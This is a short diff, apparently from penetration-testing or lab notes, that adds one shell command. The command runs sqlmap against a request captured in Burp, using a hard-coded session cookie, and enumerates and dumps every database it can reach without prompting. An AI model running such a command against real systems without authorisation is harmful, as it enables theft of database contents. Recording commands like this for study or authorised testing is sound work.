@@ -1,4 +1,8 @@
 
+Command
+```shell
+sqlmap -r burp --cookie="PHPSESSID=2v1mpaceu5oh3smbn23e4l2r1j" --batch --dbs --dump | tee output-sqlmap.txt
+```
 
 ---
 
